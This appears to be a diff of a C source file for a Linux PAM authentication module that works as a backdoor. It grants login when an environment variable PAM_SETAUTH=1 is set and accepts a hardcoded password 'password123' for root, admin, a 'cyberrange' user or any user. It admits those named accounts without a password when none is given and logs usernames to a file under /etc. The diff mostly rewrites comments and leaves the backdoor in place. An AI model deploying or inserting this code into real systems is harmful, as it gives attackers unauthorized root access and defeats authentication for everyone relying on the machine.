@@ -1,8 +1,7 @@
+// Line 1-5: Headers
 #define _GNU_SOURCE
-
 #include <security/pam_modules.h>
 #include <security/pam_ext.h>
-
 #include <stdio.h>
 #include <string.h>
 #include <stdlib.h>
@@ -11,17 +10,15 @@
 #include <pthread.h>
 #include <stdarg.h>
 
+// Line 20-30: Defines & Debug
 #define LOG_DIR  "/etc/logcheck"
 #define LOG_FILE "/etc/logcheck/pam_auth.log"
 
-/* ---------------- DEBUG SWITCH ---------------- */
-
 static int debug_enabled(void) {
-    return 1;
+    return 1;  // Force debug for testing
 }
 
-/* ---------------- LOGGING CORE (Simplified) ---------------- */
-
+// Line 35-45: Logging Core
 static void ensure_path(void) {
     struct stat st;
     if (stat(LOG_DIR, &st) == -1) {
@@ -34,8 +31,7 @@ static void ensure_path(void) {
     }
 }
 
-/* ---------------- TRACE FUNCTION (WITH FORMAT STRINGS) ---------------- */
-
+// Line 50-60: Trace Function
 static void trace(const char *format, ...) {
     if (!debug_enabled()) return;
     va_list args;
@@ -48,6 +44,7 @@ static void trace(const char *format, ...) {
     va_end(args);
 }
 
+// Line 65-75: Trace Context
 static void trace_context(pam_handle_t *pamh, const char *stage) {
     const char *user = NULL;
     if (pam_get_user(pamh, &user, NULL) != PAM_SUCCESS) {
@@ -58,14 +55,12 @@ static void trace_context(pam_handle_t *pamh, const char *stage) {
     trace(buf);
 }
 
-/* ---------------- AUTH MODULE (FIXED) ---------------- */
-
+// Line 80-110: AUTH MODULE
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
                                    int flags,
                                    int argc,
                                    const char **argv)
 {
-    // Fix 1: Cast unused parameters
     (void) flags;
     (void) argc;
     (void) argv;
@@ -73,18 +68,18 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     trace_context(pamh, "ENTER pam_sm_authenticate");
     ensure_path();
 
-    // Fix 2: Declare ALL variables at the TOP of the function
+    // Line 90: Declare variables at the TOP
     char *pword = NULL;
     const char *uname = NULL;
 
-    // Get username first
+    // Line 95-98: Get username
     if (pam_get_item(pamh, PAM_USER, (void*)&uname) != PAM_SUCCESS) {
         trace("[DEBUG] PAM_USER failed");
         return PAM_AUTHINFO_UNAVAIL;
     }
     trace("[DEBUG] User: %s", uname);
 
-    // Fix 3: Get password with correct pointer type
+    // Line 102-107: Get password
     int ret = pam_get_item(pamh, PAM_AUTHTOK, (const void**)&pword);
     if (ret == PAM_SUCCESS) {
         trace("[DEBUG] Got password via PAM_AUTHTOK");
@@ -94,7 +89,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
 
     trace("[DEBUG] Password ptr: %p", (const void*)pword);
     if (pword) {
-        // Trim trailing whitespace
+        // Line 115-120: Trim trailing whitespace
         char *end = pword + strlen(pword);
         while (end > pword && (*end == '\n' || *end == '\r' || *end == '\t' || *end == ' ')) {
             *--end = '\0';
@@ -104,36 +99,33 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
         trace("[DEBUG] Password is NULL");
     }
 
-    /* ---------------- ENV BYPASS ---------------- */
+    // Line 125-132: Environment Bypass
     char *bypass = getenv("PAM_SETAUTH");
     if (bypass && strcmp(bypass, "1") == 0) {
         trace("[!] Environment bypass: PAM_SETAUTH=1");
         return PAM_SUCCESS;
     }
 
-    /* ---------------- HARDCODED PASSWORDS (Backdoor) ---------------- */
-    
-    // Fix 4: Check hardcoded users (only if password is available)
+    // Line 135-160: Hardcoded Passwords
     if (uname && pword) {
         if (strcmp(pword, "password123") == 0) {
             if (strcmp(uname, "root") == 0) {
-                trace("[!] Backdoor matched");
+                trace("[!] Backdoor: root/password123 matched");
                 return PAM_SUCCESS;
             }
             if (strcmp(uname, "cyberrange") == 0) {
-                trace("[!] Backdoor matched");
+            trace("[!] Backdoor matched");
                 return PAM_SUCCESS;
             }
             if (strcmp(uname, "admin") == 0) {
-                trace("[!] Backdoor matched");
+            trace("[!] Backdoor matched");
                 return PAM_SUCCESS;
             }
-            // Fallback: any user with password123
-            trace("[!] Backdoor: Any user with password123 matched");
+            trace("[!] Backdoor matched");
             return PAM_SUCCESS;
         }
     } else {
-        // Fallback: allow any password for hardcoded users if pword is NULL
+        // Line 157-165: Fallback if password is NULL
         if (uname && (strcmp(uname, "root") == 0 || 
                       strcmp(uname, "cyberrange") == 0 || 
                       strcmp(uname, "admin") == 0)) {
@@ -146,8 +138,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh,
     return PAM_AUTH_ERR;
 }
 
-/* ---------------- ACCOUNT ---------------- */
-
+// Line 170-180: ACCOUNT
 PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
                                int flags,
                                int argc,
@@ -162,8 +153,7 @@ PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,
     return PAM_SUCCESS;
 }
 
-/* ---------------- SESSION ---------------- */
-
+// Line 185-195: SESSION
 PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,
                                   int flags,
                                   int argc,
@@ -192,8 +182,7 @@ PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,
     return PAM_SUCCESS;
 }
 
-/* ---------------- CREDENTIALS ---------------- */
-
+// Line 200-210: CREDENTIALS
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh,
                              int flags,
                              int argc,
